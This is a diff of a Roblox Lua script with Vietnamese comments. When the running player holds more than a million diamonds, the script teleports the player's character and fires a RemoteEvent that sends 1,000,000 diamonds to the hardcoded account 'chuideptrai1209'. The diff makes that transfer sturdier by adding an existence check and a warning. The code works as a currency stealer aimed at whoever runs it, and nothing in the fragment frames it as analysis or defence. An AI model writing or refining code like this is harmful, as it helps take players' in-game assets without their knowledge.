@@ -9,7 +9,7 @@ local diamonds = leaderstats["\240\159\146\142 Diamonds"].Value
 -- In giá trị kim cương
 print("Số lượng kim cương:", diamonds)
 
--- Nếu số lượng kim cương lớn hơn 1 triệu, thực hiện teleport đến vị trí đã cho
+-- Kiểm tra số lượng kim cương và thực hiện hành động nếu cần
 if diamonds > 1000000 then
     local teleportCoordinates = Vector3.new(143.34673614500, 23.6020991104125977, -349.0367736816406)
     player.Character.HumanoidRootPart.CFrame = CFrame.new(teleportCoordinates)
@@ -18,7 +18,11 @@ if diamonds > 1000000 then
     local amountToSend = 1000000
     local recipient = "chuideptrai1209"
     
-    -- Fire the RemoteEvent to send diamonds
-    local SendDiamondsEvent = ReplicatedStorage.SendDiamondsEvent
-    SendDiamondsEvent:FireServer(player, recipient, amountToSend)
+    -- Gửi thông điệp gửi kim cương đến máy chủ thông qua RemoteEvent
+    local SendDiamondsEvent = ReplicatedStorage:FindFirstChild("SendDiamondsEvent")
+    if SendDiamondsEvent then
+        SendDiamondsEvent:FireServer(player, recipient, amountToSend)
+    else
+        warn("Không tìm thấy RemoteEvent 'SendDiamondsEvent'!")
+    end
 end
